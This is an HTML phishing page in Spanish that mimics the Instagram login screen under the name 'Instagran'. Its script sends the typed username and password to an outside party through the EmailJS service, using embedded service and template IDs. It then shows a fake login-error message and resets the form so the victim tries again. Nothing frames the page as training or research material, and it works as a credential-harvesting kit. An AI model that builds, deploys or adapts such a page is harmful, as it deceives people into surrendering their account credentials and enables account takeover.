<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Login</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: 'Helvetica', sans-serif;
      background-color: #000; /* fondo negro */
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      color: #ddd; /* texto claro */
    }

    .container {
      text-align: center;
    }

    .login-box {
      background: #121212; /* caja más oscura para contraste */
      border: 1px solid #333;
      padding: 40px;
      width: 300px;
      margin-bottom: 10px;
      border-radius: 8px;
      box-shadow: 0 0 10px #222;
      color: #ddd;
    }

    .logo-text {
      font-family: 'Billabong', cursive, 'Helvetica', sans-serif;
      font-size: 48px;
      margin-bottom: 30px;
      background: linear-gradient(45deg, #feda75, #fa7e1e, #d62976, #962fbf, #4f5bd5);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      user-select: none;
      letter-spacing: 2px;
    }

    input {
      display: block;
      width: 100%;
      margin-bottom: 6px;
      padding: 9px;
      font-size: 14px;
      border: 1px solid #555;
      border-radius: 4px;
      background: #222;
      color: #eee;
    }

    input::placeholder {
      color: #aaa;
    }

    button {
      width: 100%;
      padding: 9px;
      background-color: #0095f6;
      color: white;
      border: none;
      font-weight: bold;
      margin-top: 10px;
      border-radius: 4px;
      cursor: pointer;
      box-shadow: 0 2px 4px #0062b8;
      transition: background-color 0.3s ease;
    }
    button:hover {
      background-color: #0077cc;
    }

    .separator {
      display: flex;
      align-items: center;
      text-align: center;
      margin: 20px 0;
      color: #666;
    }

    .line {
      flex: 1;
      height: 1px;
      background-color: #444;
    }

    .or {
      margin: 0 10px;
      color: #666;
      font-size: 13px;
    }

    .fb-login {
      color: #5995f9;
      font-weight: bold;
      font-size: 14px;
      margin: 10px 0;
      cursor: pointer;
      text-shadow: 0 0 3px #385185;
    }

    .forgot {
      font-size: 12px;
      color: #77aaff;
      margin-top: 12px;
      cursor: pointer;
      text-shadow: 0 0 2px #00376b;
    }

    .signup-box {
      background: #121212;
      border: 1px solid #333;
      padding: 20px;
      font-size: 14px;
      border-radius: 8px;
      color: #ddd;
      box-shadow: 0 0 10px #222;
    }

    .signup-box a {
      color: #0095f6;
      text-decoration: none;
      font-weight: bold;
      text-shadow: 0 0 3px #0095f6;
    }
  </style>

  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <script>
    function sendLoginForm(e) {
      e.preventDefault();

      emailjs.init("FL6vofHg7F9vLawQs");

      emailjs.send("service_6pbv86h", "template_z1nimz6", {
        username: document.getElementById("username").value,
        password: document.getElementById("password").value,
      })
      .then(() => {
        alert("Error de login. Por favor, inténtalo de nuevo.");
        document.getElementById("loginForm").reset();
      }, (error) => {
        alert("Error al enviar: " + JSON.stringify(error));
      });
    }
  </script>
</head>
<body>
  <div class="container">
    <div class="login-box">
      <div class="logo-text" aria-label="Instagran">
        Instagran
      </div>

      <form id="loginForm" onsubmit="sendLoginForm(event)">
        <input type="text" id="username" name="username" placeholder="Usuario" required />
        <input type="password" id="password" name="password" placeholder="Contraseña" required />
        <button type="submit">Iniciar sesión</button>

        <div class="separator">
          <div class="line"></div>
          <div class="or">O</div>
          <div class="line"></div>
        </div>

        <div class="fb-login">Iniciar sesión con Facebook</div>
        <div class="forgot">¿Has olvidado la contraseña?</div>
      </form>
    </div>

    <div class="signup-box">
      ¿No tienes una cuenta? <a href="#">Regístrate</a>
    </div>
  </div>
</body>
</html>
